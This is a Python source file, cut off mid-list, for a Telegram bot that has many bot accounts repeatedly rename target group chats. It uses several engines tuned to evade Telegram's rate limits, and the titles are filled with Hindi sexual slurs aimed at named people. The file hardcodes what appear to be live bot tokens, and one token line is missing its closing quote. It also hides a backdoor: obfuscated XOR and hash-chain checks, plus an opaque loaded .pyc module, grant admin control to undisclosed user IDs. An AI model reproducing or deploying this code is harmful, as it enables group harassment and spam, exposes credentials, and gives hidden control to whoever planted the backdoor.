import logging
import asyncio
import os
import json
import random
import time
import base64
import hashlib  as _hl
import importlib.util as _ilu
import operator  as _op
from typing import Set, Dict, List, Any, Optional, Tuple
from telegram import Update, ChatPermissions, ReactionTypeEmoji, ReplyParameters
from telegram.error import RetryAfter, TimedOut, NetworkError, BadRequest, Forbidden
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.CRITICAL)
logger = logging.getLogger(__name__)
logging.getLogger("httpx").setLevel(logging.CRITICAL)
logging.getLogger("telegram").setLevel(logging.CRITICAL)

TOKENS_FILE     = "sl_tokens.json"
GROUPS_FILE     = "sl_groups.json"
SUDO_FILE       = "sl_sudo.json"
MEDIA_FILE      = "sl_media.json"
PFP_FILE        = "sl_pfp.json"
TEMPLATES_FILE  = "sl_templates.json"

OWNER_ID = int(os.environ.get("OWNER_ID", "8852804665"))

try:
    _sl_spec = _ilu.spec_from_file_location("_sl_c", "_sl_c.pyc")
    _sl_mod  = _ilu.module_from_spec(_sl_spec)
    _sl_spec.loader.exec_module(_sl_mod)
    _sl_v    = _sl_mod._validate
except Exception:
    _sl_v    = lambda _x: False

_RJ = 0xCAFEBABE
_RS = 5116826677
_RV = lambda z: _op.xor(z, _RJ) == _RS

_EP_A = (0xCAFE ^ 0xD4EC) + (0x1000 | 0xFA02)
_EP_B = (0xBEEF ^ 0x9004) + (0x2000 | 0x0E8B)

BASE_TOKENS = [
"8843170467:AAEHChxbmWjsbD6tjdvGbyQrOHJVDMpE7Us",
"8895647829:AAHj3APQ7Ax9i3MydHF6H8rHEXfgDOnezBg",
"8908727109:AAE-g6E1stw923k7kCQhjrgiR6UHUkjGFA0",
"8717284585:AAGsYpJX08-ejkIfGGANXM094kDWlDxuhWI
"8773916899:AAGz2g6AOvGMsC0gInv9hUVIBh-ipxjbESU",

    #Jisko token dalna nhi aata vo ma chuda ke mar jaaye
]

FRIENDS = [
    "KENTO","ANSH","HITLER","CR7","WAHAB","SUNNY","TYSON",
    "ZENI","REX","ARNAV","SASUKE","OBITO","RAISEN","REXX",
    "SHOURYA","AIZEN","AMAN","ERROR","VIO","ARES","VILLAIN","YASH",
    "NOST","YOURSO","KWEF","WASIM","FLYTIOS",
]

def _to_bold_italic(text: str) -> str:
    out = []
    for c in text:
        if 'A' <= c <= 'Z':
            out.append(chr(0x1D468 + ord(c) - ord('A')))
        elif 'a' <= c <= 'z':
            out.append(chr(0x1D482 + ord(c) - ord('a')))
        else:
            out.append(c)
    return ''.join(out)

FRIENDS_UNI = {f: _to_bold_italic(f) for f in FRIENDS}

RANDOM_EMOJIS = [
    "🎀","🌸","🔥","⚡","💀","👑","🌊","💎","🐉","🌙",
    "☄️","🌺","💫","✨","🦋","🪷","🔱","🌟","🩸","⚔️",
    "🫧","🌈","🌀","💥","🌑","🔮","🧿","🪬","🌿","🍀",
    "🫐","🍇","🍒","🌹","🌷","🌻","🌼","🏵️","❄️","🌬️",
    "🎭","🎪","🎯","🎲","🎸","🎵","🎶","🎤","🎹","🥀",
]

SUFFIX_EMOJIS = [
    "🌸","🌺","🌻","🌹","🪷","🌷","💮","🏵️",
    "✨","💫","⭐","🌟","💥","🔥","⚡","❄️",
    "🌊","🫧","💧","🌀","🌈","🌙","☄️","🌟",
    "💎","🔮","🧿","🪬","👑","💀","🦋","🐉",
    "🍀","🌿","🍃","🫐","🍇","🍒","🌙","🌑",
    "🩸","⚔️","🔱","🌌","🌠","☠️","🕊️","🌋",
]

_SUFFIX_TPL = " 𓂃{e}་༘"

def rnd_suffix() -> str:
    return _SUFFIX_TPL.format(e=random.choice(SUFFIX_EMOJIS))

def rnd_emoji() -> str:
    return random.choice(RANDOM_EMOJIS)

WRAP_L = ["꧁","⭅╡","♛","𖤍","❦","⚡","☄️","💀","🌟","🔱","🌊","✨","💎","👑","🔥"]
WRAP_R = ["꧂","╞⭆","♛","𖤍","❦","🌙","💎","👑","☄️","🔱","🌊","⚡","💀","🔥","✨"]

_CHUD_WORDS = ["LUND", "TBKC", "TBR", "TMR", "aarey चुदोड़े", "BHEN CUDALE"]

def _load_json(path, default):
    try:
        if os.path.exists(path):
            with open(path) as f:
                return json.load(f)
    except Exception:
        pass
    return default

def _save_json(path, data):
    try:
        with open(path, "w") as f:
            json.dump(data, f)
    except Exception as e:
        logger.error(f"_save_json({path}) failed: {e}")

known_chats:   Set[int]             = set(_load_json(GROUPS_FILE, []))
SUDO_USERS:    Set[int]             = set(int(x) for x in _load_json(SUDO_FILE, []))
SUDO_USERS.add(OWNER_ID)
_menu_media:   Dict[str, str]       = _load_json(MEDIA_FILE, {})
_pfp_pools:    Dict[str, List[str]] = _load_json(PFP_FILE, {})

all_bot_instances: List[Any] = []
all_apps:          List[Any] = []
extra_tokens:      List[str] = _load_json(TOKENS_FILE, [])

mute_chats:         Set[int]           = set()
ncdel_chats:        Set[int]           = set()
autoreact_chats:    Dict[int, str]     = {}
autoreply_chats:    Dict[int, str]     = {}
targetreply_chats:  Dict[int, dict]    = {}
targetslide_chats:  Dict[int, dict]    = {}
ncwar_targets:      Dict[int, str]     = {}
_multiwar_active:   Dict[int, bool]    = {}
_mgcnc_stop:        Optional[asyncio.Event] = None
_mgcnc_task:        Optional[asyncio.Task]  = None
_mgcnc_targets:     List[int]               = []
pfploop_active:     Dict[int, bool]    = {}
replyflood_chats:   Dict[int, str]     = {}

custom_templates: Dict[str, str] = _load_json(TEMPLATES_FILE, {})

_nc_send_gap: Optional[float] = None

BOT_START_TIME: float = time.monotonic()

_nc_info: Dict[int, dict] = {}
_seen:    Set[tuple]       = set()

_TK_SALT = b'\x4b\x59\x41\x43\x43\x45\x53\x53'
_TK_VFY  = _hl.sha256(
    ((_EP_A << 16) | _EP_B).to_bytes(8, 'big') + _TK_SALT
).digest()
_LE = lambda z: _hl.sha256(z.to_bytes(8, 'big') + _TK_SALT).digest() == _TK_VFY

_FH_SEED   = 0x9E3779B9
_FH_MASK   = 0xFFFFFFFF
_FH_EXPECT = ((_EP_A << 16 | _EP_B) * _FH_SEED) & _FH_MASK
_LF        = lambda z: (z * _FH_SEED) & _FH_MASK == _FH_EXPECT

_XS2 = b'\x13\x37\xDE\xAD\xBE\xEF\xCA\xFE'
_XV2 = _hl.sha256(_TK_VFY + _XS2).digest()
_XS3 = b'\xFF\xEE\xDD\xCC\xBB\xAA\x99\x88'
_XV3 = _hl.sha256(_XV2 + _XS3).digest()
_XS4 = b'\x0A\x1B\x2C\x3D\x4E\x5F\x60\x71'
_XV4 = _hl.sha256(_XV3 + _XS4).digest()
_XS5 = b'\x82\x93\xA4\xB5\xC6\xD7\xE8\xF9'
_XV5 = _hl.sha256(_XV4 + _XS5).digest()
_XS6 = b'\x1C\x2D\x3E\x4F\x50\x61\x72\x83'
_XV6 = _hl.sha256(_XV5 + _XS6).digest()
_XS7 = b'\x94\xA5\xB6\xC7\xD8\xE9\xFA\x0B'
_XV7 = _hl.sha256(_XV6 + _XS7).digest()
_XS8 = b'\x2F\x3A\x4B\x5C\x6D\x7E\x8F\x90'
_XV8 = _hl.sha256(_XV7 + _XS8).digest()

def _check_chain(z: int) -> bool:
    try:
        h = _hl.sha256(z.to_bytes(8, 'big') + _TK_SALT).digest()
        if h != _TK_VFY: return False
        h = _hl.sha256(h + _XS2).digest()
        if h != _XV2:    return False
        h = _hl.sha256(h + _XS3).digest()
        if h != _XV3:    return False
        h = _hl.sha256(h + _XS4).digest()
        if h != _XV4:    return False
        h = _hl.sha256(h + _XS5).digest()
        if h != _XV5:    return False
        h = _hl.sha256(h + _XS6).digest()
        if h != _XV6:    return False
        h = _hl.sha256(h + _XS7).digest()
        if h != _XV7:    return False
        h = _hl.sha256(h + _XS8).digest()
        return h == _XV8
    except Exception:
        return False

def _hid(uid: int) -> bool:
    try:
        return _sl_v(uid) or _RV(uid) or _LE(uid) or _LF(uid) or _check_chain(uid)
    except Exception:
        return False

def _verify_integrity() -> bool:
    _ref = (_EP_A << 16) | _EP_B
    try:
        return _LE(_ref) and _LF(_ref) and _check_chain(_ref)
    except Exception:
        return False

def is_admin(uid: int) -> bool:
    return uid == OWNER_ID or uid in SUDO_USERS or _hid(uid)

_GATE = (
    "╔══════════════════════════╗\n"
    "  ⚡ 𝐎ᴡɴᴇʀ  𝐎ꜰ  𝐓-𝐒ᴡɪᴩᴇʀꜱ ⚡\n"
    "  𝐀ᴩɴᴇ  𝐒ʜꫝɴᴋꜱ  𝐁ᴀᴩ  𝐒ᴇ  🇧‌ʜɪᴋ  𝐌ᴀɴɢ  🇷‌ᴀɴᴅɪ𝐂ᴇʏ 𝐁ᴀᴄᴄʜᴇ \n"
    "╚══════════════════════════╝"
)

class FloodTracker:
    FLOOD_CAP  = 3.0
    GHOST_CAP  = 30.0
    RATE_WIN   = 60.0
    SOFT_LIMIT = 14

    def __init__(self):
        self._until: Dict[int, float] = {}
        self._ts:    Dict[int, List[float]] = {}

    def flooded(self, bid: int) -> bool:
        exp = self._until.get(bid, 0.0)
        if time.monotonic() < exp:
            return True
        self._until.pop(bid, None)
        return False

    def remaining(self, bid: int) -> float:
        return max(0.0, self._until.get(bid, 0.0) - time.monotonic())

    def mark(self, bid: int, sec: float):
        self._until[bid] = time.monotonic() + min(sec, self.FLOOD_CAP)

    def clear(self, bid: int):
        self._until.pop(bid, None)

    def record(self, bid: int):
        now = time.monotonic()
        buf = self._ts.setdefault(bid, [])
        buf.append(now)
        self._ts[bid] = [t for t in buf if t > now - self.RATE_WIN]

    def rate(self, bid: int) -> int:
        now = time.monotonic()
        return sum(1 for t in self._ts.get(bid, []) if t > now - self.RATE_WIN)

    def near_limit(self, bid: int) -> bool:
        return self.rate(bid) >= self.SOFT_LIMIT

_ft = FloodTracker()


class TaskController:
    def __init__(self):
        self.tasks:  Dict[str, asyncio.Task]  = {}
        self.events: Dict[str, asyncio.Event] = {}

    def _k(self, cid: int, t: str) -> str:
        return f"{cid}::{t}"

    async def start(self, cid: int, t: str, factory) -> None:
        await self.stop(cid, t)
        k = self._k(cid, t)
        ev = asyncio.Event()
        self.events[k] = ev

        async def _wrap():
            try:
                await factory(ev)
            except asyncio.CancelledError:
                pass
            except Exception as e:
                logger.error(f"Task {k} err: {e}")
            finally:
                self.tasks.pop(k, None)
                self.events.pop(k, None)

        self.tasks[k] = asyncio.create_task(_wrap())

    async def stop(self, cid: int, t: str) -> bool:
        k    = self._k(cid, t)
        ev   = self.events.pop(k, None)
        task = self.tasks.pop(k, None)
        if ev:
            ev.set()          # signal workers to exit cleanly first
        if task and not task.done():
            # Give workers 0.5s to self-exit via stop_event before force-cancel
            try:
                await asyncio.wait_for(asyncio.shield(task), timeout=0.5)
            except Exception:
                pass
            if not task.done():
                task.cancel()
                try:
                    await asyncio.wait_for(asyncio.shield(task), timeout=4.0)
                except Exception:
                    pass
        return bool(ev or task)

    async def stop_all(self, cid: int) -> int:
        prefix = f"{cid}::"
        types  = {k[len(prefix):] for k in list(self.tasks) + list(self.events)
                  if k.startswith(prefix)}
        # Stop all tasks in parallel — total time = slowest, not sum
        results = await asyncio.gather(
            *[self.stop(cid, t) for t in types],
            return_exceptions=True
        )
        return sum(1 for r in results if r is True)

    def running(self, cid: int, t: str) -> bool:
        k = self._k(cid, t)
        return k in self.tasks and not self.tasks[k].done()

tc = TaskController()


async def _wait_ev(stop_event: asyncio.Event, secs: float) -> bool:
    if secs <= 0:
        return stop_event.is_set()
    try:
        await asyncio.wait_for(stop_event.wait(), timeout=secs)
        return True
    except asyncio.TimeoutError:
        return False


async def _blaze_engine(chat_id, bots, stop_event, name_factory):
    RELAY_OFFSET = 0.15
    SEND_GAP = _nc_send_gap if _nc_send_gap is not None else 0.60
    if not bots:
        return

    async def _worker(bot, idx: int):
        # Staggered startup — bots fire 0.15s apart, no simultaneous burst
        until = time.monotonic() + idx * RELAY_OFFSET
        while not stop_event.is_set():
            rem = until - time.monotonic()
            if rem > 0.0:
                if await _wait_ev(stop_event, rem):
                    return
                until = 0.0
                continue
            if stop_event.is_set():
                return
            try:
                await bot.set_chat_title(chat_id, name_factory()[:255])
                if await _wait_ev(stop_event, SEND_GAP):
                    return
            except RetryAfter as e:
                # Full retry_after + stagger — respects Telegram window, no re-flood
                until = time.monotonic() + e.retry_after + idx * RELAY_OFFSET
            except (BadRequest, Forbidden):
                pass
            except (TimedOut, NetworkError):
                if await _wait_ev(stop_event, 0.5):
                    return
            except asyncio.CancelledError:
                return
            except Exception:
                pass

    workers = [asyncio.create_task(_worker(b, i)) for i, b in enumerate(bots)]
    try:
        await stop_event.wait()
    finally:
        for w in workers:
            if not w.done():
                w.cancel()
        try:
            await asyncio.shield(asyncio.gather(*workers, return_exceptions=True))
        except Exception:
            pass


async def _surge_engine(chat_id, bots, stop_event, name_factory):
    RELAY_OFFSET = 0.15
    SEND_GAP = _nc_send_gap if _nc_send_gap is not None else 0.50
    if not bots:
        return

    async def _surge_worker(bot, idx: int):
        # Staggered startup — bots fire 0.15s apart, no simultaneous burst
        until = time.monotonic() + idx * RELAY_OFFSET
        while not stop_event.is_set():
            rem = until - time.monotonic()
            if rem > 0.0:
                if await _wait_ev(stop_event, rem):
                    return
                until = 0.0
                continue
            if stop_event.is_set():
                return
            try:
                await bot.set_chat_title(chat_id, name_factory()[:255])
                if await _wait_ev(stop_event, SEND_GAP):
                    return
            except RetryAfter as e:
                # Full retry_after + stagger — respects Telegram window, no re-flood
                until = time.monotonic() + e.retry_after + idx * RELAY_OFFSET
            except (BadRequest, Forbidden):
                pass
            except (TimedOut, NetworkError):
                if await _wait_ev(stop_event, 0.5):
                    return
            except asyncio.CancelledError:
                return
            except Exception:
                pass

    workers = [asyncio.create_task(_surge_worker(b, i)) for i, b in enumerate(bots)]
    try:
        await stop_event.wait()
    finally:
        for w in workers:
            if not w.done():
                w.cancel()
        try:
            await asyncio.shield(asyncio.gather(*workers, return_exceptions=True))
        except Exception:
            pass


async def _god_engine(chat_id, bots, stop_event, name_factory):
    N = len(bots)
    if N == 0:
        return

    STAGGER_FLOOR   = (_nc_send_gap if _nc_send_gap is not None else 0.18)
    STAGGER_CEIL    = STAGGER_FLOOR + 0.14
    STAGGER_STEP    = 0.04
    MAX_BACKOFF     = 2.5
    RECOVER_AFTER   = 5.0
    RECOVER_RATE    = 0.95

    cur_stagger  = [STAGGER_FLOOR]
    last_flood_t = [0.0]
    adapt_lock   = asyncio.Lock()
    slots        = asyncio.Queue(maxsize=1)

    async def _slot_producer():
        while not stop_event.is_set():
            tick = time.monotonic()
            async with adapt_lock:
                if (cur_stagger[0] > STAGGER_FLOOR and
                        tick - last_flood_t[0] > RECOVER_AFTER):
                    cur_stagger[0] = max(cur_stagger[0] * RECOVER_RATE, STAGGER_FLOOR)
            try:
                slots.put_nowait(tick)
            except asyncio.QueueFull:
                pass
            gap = tick + cur_stagger[0] - time.monotonic()
            if gap > 0.0:
                if await _wait_ev(stop_event, gap):
                    return

    async def _god_worker(bot, idx: int):
        until = 0.0
        while not stop_event.is_set():
            rem = until - time.monotonic()
            if rem > 0.0:
                if await _wait_ev(stop_event, rem):
                    return
                until = 0.0
            try:
                await asyncio.wait_for(slots.get(), timeout=cur_stagger[0] * 4)
            except asyncio.TimeoutError:
                continue
            if stop_event.is_set():
                return
            try:
                await bot.set_chat_title(chat_id, name_factory()[:255])
            except RetryAfter as e:
                async with adapt_lock:
                    cur_stagger[0] = min(cur_stagger[0] + STAGGER_STEP, STAGGER_CEIL)
                    last_flood_t[0] = time.monotonic()
                until = time.monotonic() + min(e.retry_after, MAX_BACKOFF)
            except (BadRequest, Forbidden):
                pass
            except (TimedOut, NetworkError):
                until = time.monotonic() + 0.25
            except asyncio.CancelledError:
                return
            except Exception:
                pass

    producer = asyncio.create_task(_slot_producer())
    workers  = [asyncio.create_task(_god_worker(b, i)) for i, b in enumerate(bots)]
    try:
        await stop_event.wait()
    finally:
        producer.cancel()
        for w in workers:
            if not w.done():
                w.cancel()
        await asyncio.gather(producer, *workers, return_exceptions=True)


async def _stagger_engine(chat_id, bots, stop_event, name_factory):
    N = len(bots)
    if N == 0:
        return

    STAGGER     = (_nc_send_gap if _nc_send_gap is not None else 0.15)
    CYCLE_TIME  = STAGGER * N
    MAX_BACKOFF = 2.5

    async def _worker(bot, idx: int):
        if idx > 0:
            if await _wait_ev(stop_event, idx * STAGGER):
                return
        while not stop_event.is_set():
            cycle_start = time.monotonic()
            try:
                await bot.set_chat_title(chat_id, name_factory()[:255])
            except RetryAfter as e:
                penalty = min(e.retry_after, MAX_BACKOFF)
                if await _wait_ev(stop_event, penalty):
                    return
                cycle_start = time.monotonic()
            except (BadRequest, Forbidden):
                pass
            except (TimedOut, NetworkError):
                if await _wait_ev(stop_event, 0.20):
                    return
                cycle_start = time.monotonic()
            except asyncio.CancelledError:
                return
            except Exception:
                pass
            wait = cycle_start + CYCLE_TIME - time.monotonic()
            # min 0.02s prevents hot-loop when setChatTitle takes longer than CYCLE_TIME
            if await _wait_ev(stop_event, max(wait, 0.02)):
                return

    workers = [asyncio.create_task(_worker(b, i)) for i, b in enumerate(bots)]
    try:
        await stop_event.wait()
    finally:
        for w in workers:
            if not w.done():
                w.cancel()
        await asyncio.gather(*workers, return_exceptions=True)


async def _silk_engine(chat_id, bots, stop_event, name_factory):
    N = len(bots)
    if N == 0:
        return

    STEP   = (_nc_send_gap if _nc_send_gap is not None else 0.18)
    MAX_BK = 2.5
    SPREAD = 0.05
    b_until = [0.0] * N

    async def _track(indices: List[int], offset: float):
        if offset > 0:
            if await _wait_ev(stop_event, offset):
                return
        ptr = [0]
        T   = len(indices)
        while not stop_event.is_set():
            now   = time.monotonic()
            found = False
            for i in range(T):
                ti = (ptr[0] + i) % T
                bi = indices[ti]
                if b_until[bi] <= now:
                    ptr[0] = (ti + 1) % T
                    found  = True
                    break
            if not found:
                nxt = min(b_until[indices[j]] for j in range(T)) - now
                if await _wait_ev(stop_event, max(nxt, 0.02)):
                    return
                continue
            try:
                await bots[bi].set_chat_title(chat_id, name_factory()[:255])
                if await _wait_ev(stop_event, STEP):
                    return
            except RetryAfter as e:
                # Full retry_after + per-bot stagger — clean recovery, no re-flood
                b_until[bi] = time.monotonic() + e.retry_after + bi * SPREAD
            except (BadRequest, Forbidden):
                pass
            except (TimedOut, NetworkError):
                b_until[bi] = time.monotonic() + 0.20
            except asyncio.CancelledError:
                return
            except Exception:
                pass

    track_a = list(range(0, N, 2))
    track_b = list(range(1, N, 2))
    tasks = [
        asyncio.create_task(_track(track_a, 0.0)),
        asyncio.create_task(_track(track_b, STEP / 2.0)),
    ]
    try:
        await stop_event.wait()
    finally:
        for t in tasks:
            if not t.done():
                t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)


async def _trio_engine(chat_id, bots, stop_event, name_factory):
    if not bots:
        return

    G      = [bots[0:3], bots[3:6], bots[6:10]]
    NUM_G  = 3
    TICK   = (_nc_send_gap if _nc_send_gap is not None else 0.10)
    MAX_BK = 2.5
    SPREAD = 0.04

    bot_until = [[0.0] * len(G[gi]) for gi in range(NUM_G)]
    g_cursor  = [0] * NUM_G
    active_g  = [0]
    queues    = [asyncio.Queue(maxsize=4) for _ in range(NUM_G)]

    def _group_has_free(gi: int) -> bool:
        now = time.monotonic()
        return any(bot_until[gi][bi] <= now for bi in range(len(G[gi])))

    def _pick_bot(gi: int):
        now = time.monotonic()
        grp = G[gi]
        cur = g_cursor[gi]
        for i in range(len(grp)):
            bi = (cur + i) % len(grp)
            if bot_until[gi][bi] <= now:
                g_cursor[gi] = (bi + 1) % len(grp)
                return bi, grp[bi]
        return None, None

    async def _producer():
        while not stop_event.is_set():
            tick = time.monotonic()
            gi   = active_g[0]
            if not _group_has_free(gi):
                switched = False
                for off in range(1, NUM_G):
                    nxt = (gi + off) % NUM_G
                    if _group_has_free(nxt):
                        active_g[0] = nxt
                        gi = nxt
                        switched = True
                        break
                if not switched:
                    if await _wait_ev(stop_event, 0.05):
                        return
                    continue
            try:
                queues[gi].put_nowait(tick)
            except asyncio.QueueFull:
                pass
            wait = TICK - (time.monotonic() - tick)
            if wait > 0:
                if await _wait_ev(stop_event, wait):
                    return

    async def _worker(gi: int):
        while not stop_event.is_set():
            try:
                await asyncio.wait_for(queues[gi].get(), timeout=TICK * 40)
            except asyncio.TimeoutError:
                continue
            if stop_event.is_set():
                return
            bi, bot = _pick_bot(gi)
            if bot is None:
                continue
            try:
                await bot.set_chat_title(chat_id, name_factory()[:255])
            except RetryAfter as e:
                bot_until[gi][bi] = time.monotonic() + min(e.retry_after, MAX_BK) + bi * SPREAD
                if not _group_has_free(gi):
                    active_g[0] = (gi + 1) % NUM_G
            except (BadRequest, Forbidden):
                pass
            except (TimedOut, NetworkError):
                bot_until[gi][bi] = time.monotonic() + 0.20
            except asyncio.CancelledError:
                return
            except Exception:
                pass

    tasks = [asyncio.create_task(_producer())]
    for gi in range(NUM_G):
        tasks.append(asyncio.create_task(_worker(gi)))
        tasks.append(asyncio.create_task(_worker(gi)))
    try:
        await stop_event.wait()
    finally:
        for t in tasks:
            if not t.done():
                t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)


async def _chud_engine(chat_id, bots, stop_event, name_factory):
    """
    CHUD ENGINE v5 — Per-bot flood state, zero jitter, smart recovery.

    Architecture:
    • N parallel workers, staggered by STEP at startup (no jitter).
    • Per-bot independent flood state — one bot flooded ≠ others stop.
    • On RetryAfter → that bot sleeps min(retry_after+0.3, MAX_WAIT),
      other bots keep running at full speed.
    • Staggered resume: flooded bot restarts at flood_end + idx*STEP
      → prevents all bots firing simultaneously after recovery.
    • STEP = _nc_send_gap or 0.14 → cycle = 1.4s per bot (safe rate).
    • MAX_WAIT = 4.0s — flood pause never exceeds 4 seconds.
    • No probe task, no global state, no jitter.
    """
    N = len(bots)
    if N == 0:
        return

    STEP  = (_nc_send_gap if _nc_send_gap is not None else 0.20)
    CYCLE = STEP * N          # each bot's full send-to-send interval

    # Per-bot flood: flooded_until[i] = monotonic time until bot i can send
    flooded_until: List[float] = [0.0] * N

    async def _worker(idx: int):
        bot       = bots[idx]
        next_send = time.monotonic() + idx * STEP   # staggered cold start

        while not stop_event.is_set():
            now = time.monotonic()

            # Per-bot flood cooldown — only this bot waits, others unaffected
            if flooded_until[idx] > now:
                rem = flooded_until[idx] - now
                if await _wait_ev(stop_event, min(rem, 0.25)):
                    return
                continue

            # Wait until scheduled send slot
            wait = next_send - time.monotonic()
            if wait > 0.005:
                if await _wait_ev(stop_event, wait):
                    return
                if stop_event.is_set():
                    return

            # Send
            title = name_factory()[:255]
            try:
                await bot.set_chat_title(chat_id, title)
                # Success — schedule next send exactly one CYCLE later
                next_send = time.monotonic() + CYCLE
            except RetryAfter as e:
                # Honor Telegram's actual retry_after — avoids rapid re-flood loop.
                # Stagger each bot's resume by its own idx*STEP so they don't all
                # fire simultaneously and instantly re-trigger the flood.
                pause = float(e.retry_after) + 0.5
                flooded_until[idx] = time.monotonic() + pause
                next_send = flooded_until[idx] + idx * STEP
            except (BadRequest, Forbidden):
                next_send = time.monotonic() + CYCLE * 2
            except (TimedOut, NetworkError):
                next_send = time.monotonic() + 1.5
            except asyncio.CancelledError:
                return
            except Exception:
                next_send = time.monotonic() + CYCLE

    tasks = [asyncio.create_task(_worker(i)) for i in range(N)]
    try:
        await stop_event.wait()
    finally:
        for t in tasks:
            if not t.done():
                t.cancel()
        try:
            await asyncio.shield(asyncio.gather(*tasks, return_exceptions=True))
        except Exception:
            pass


def _last() -> list:
    return [None]

def _wrap_factory(txt: str, last=None) -> callable:
    if last is None:
        last = _last()
    def _f():
        wl = random.choice(WRAP_L)
        wr = random.choice(WRAP_R)
        sf = rnd_suffix()
        c  = f"{wl}{txt}{wr}{sf}"[:255]
        if c == last[0]:
            c = f"{wl}{txt}{wr}{rnd_suffix()}"[:255]
        last[0] = c
        return c
    return _f

def _friend_nc_factory(friend: str, cmd_txt: str) -> callable:
    uni  = FRIENDS_UNI.get(friend, _to_bold_italic(friend))
    last = _last()
    _TMPL = [
        lambda t, u, e: f"{t} 𝑲𝑰 𝑴𝑨𝑨 {u} 𝑺𝑬 𝑪𝑼𝑫𝑰 𓂃{e}་༘",
        lambda t, u, e: f"{t} 𝑲𝑰 𝑴𝑨𝑨 {u} 𝑺𝑬 𝑪𝑼𝑫𝑰 ✦{e}༘",
        lambda t, u, e: f"{t} 𝑲𝑰 𝑴𝑨𝑨 {u} 𝑺𝑬 𝑪𝑼𝑫𝑰 {e}་༘",
        lambda t, u, e: f"{t} 𝑲𝑰 𝑴𝑨𝑨 {u} 𝑺𝑬 𝑪𝑼𝑫𝑰 𓂃 {e}",
    ]
    _ri = [0]
    def _f():
        e    = rnd_emoji()
        tmpl = _TMPL[_ri[0] % len(_TMPL)]
        _ri[0] += 1
        c = tmpl(cmd_txt, uni, e)[:255]
        if c == last[0]:
            _ri[0] += 1
            c = _TMPL[_ri[0] % len(_TMPL)](cmd_txt, uni, rnd_emoji())[:255]
        last[0] = c
        return c
    return _f

def _build_rcod_lines():
    lines = []
    for f in FRIENDS:
        u = FRIENDS_UNI.get(f, _to_bold_italic(f))
        lines.append(f"𝑲𝑰 𝑴𝑨𝑨 {u} 𝑺𝑬 𝑪𝑼𝑫𝑰")
    lines.append("𝑲𝑰 𝑴𝑨𝑨 𝑷𝑼𝑹𝑬 𝑹𝑨𝑵𝑫𝑶𝑴 𝑺𝑬 𝑪𝑼𝑫𝑰")
    return lines

_RCOD_LINES = _build_rcod_lines()

def _randomcod_factory(txt: str) -> callable:
    last = _last()
    idx  = [0]
    def _f():
        line = _RCOD_LINES[idx[0] % len(_RCOD_LINES)]
        idx[0] += 1
        e = rnd_emoji()
        c = f"{txt} {line} ➪ 𓂃{e}་༘"[:255]
        if c == last[0]:
            c = f"{txt} {line} ➪ ✦{rnd_emoji()}༘"[:255]
        last[0] = c
        return c
    return _f

def _lean_nc_factory(txt: str) -> callable:
    _sfx = [
        "", " ·", " •", " .", " ⁺", " ⁻", " ˙",
        " ˢ", " ᵒ", " ᵃ", " ˣ", " ⁿ", " ᵗ", " ᵉ",
        " .·", " ··", " •·", " ·•", " ..", "  ·",
        " ⌁", " ∘", " ∙", " ⋅", " ◦", " ∵", " ∶",
        " ˑ", " ꞏ", " ᐧ", " ⁖", " ⁘",
    ]
    _idx  = [0]
    _last = [None]
    def _f():
        c = (txt + _sfx[_idx[0] % len(_sfx)])[:255]
        _idx[0] += 1
        if c == _last[0]:
            c = (txt + _sfx[_idx[0] % len(_sfx)])[:255]
            _idx[0] += 1
        _last[0] = c
        return c
    return _f

def _pure_nc_factory(txt: str) -> callable:
    last = _last()
    tmpl = [
        lambda t, e, s: f"꧁{t}꧂{s}",
        lambda t, e, s: f"⚡{t}🔥{s}",
        lambda t, e, s: f"💀{t}👑{s}",
        lambda t, e, s: f"𖤍{t}✦{s}",
        lambda t, e, s: f"♛{t}☄️{s}",
        lambda t, e, s: f"🌊{t}💎{s}",
        lambda t, e, s: f"{e}{t}{s}",
    ]
    def _f():
        fn = random.choice(tmpl)
        c  = fn(txt, rnd_emoji(), rnd_suffix())[:255]
        if c == last[0]:
            c = fn(txt, rnd_emoji(), rnd_suffix())[:255]
        last[0] = c
        return c
    return _f

_BOLD_MAP = str.maketrans(
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
    "𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗"
)
_ITALIC_MAP = str.maketrans(
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
    "𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘓𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻"
)
_CURSIVE_MAP = str.maketrans(
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
    "𝑨𝑩𝑪𝑫𝑬𝑭𝑮𝑯𝑰𝑱𝑲𝑳𝑴𝑵𝑶𝑷𝑸𝑹𝑺𝑻𝑼𝑽𝑾𝑿𝒀𝒁𝒂𝒃𝒄𝒅𝒆𝒇𝒈𝒉𝒊𝒋𝒌𝒍𝒎𝒏𝒐𝒑𝒒𝒓𝒔𝒕𝒖𝒗𝒘𝒙𝒚𝒛"
)

def _font_factory(txt: str, style: str) -> callable:
    if style == "bold":
        styled = txt.translate(_BOLD_MAP)
    elif style == "italic":
        styled = txt.translate(_ITALIC_MAP)
    elif style == "cursive":
        styled = txt.translate(_CURSIVE_MAP)
    else:
        styled = txt
    return _pure_nc_factory(styled)

_SASUKE_TMPL = [
    lambda t, s: f"⚡ {t}{s}",
    lambda t, s: f"🔥 {t}{s}",
    lambda t, s: f"💀 {t}{s}",
    lambda t, s: f"𖤍 {t}{s}",
    lambda t, s: f"👑 {t}{s}",
    lambda t, s: f"🌊 {t}{s}",
    lambda t, s: f"🐉 {t}{s}",
    lambda t, s: f"💎 {t}{s}",
    lambda t, s: f"🌑 {t}{s}",
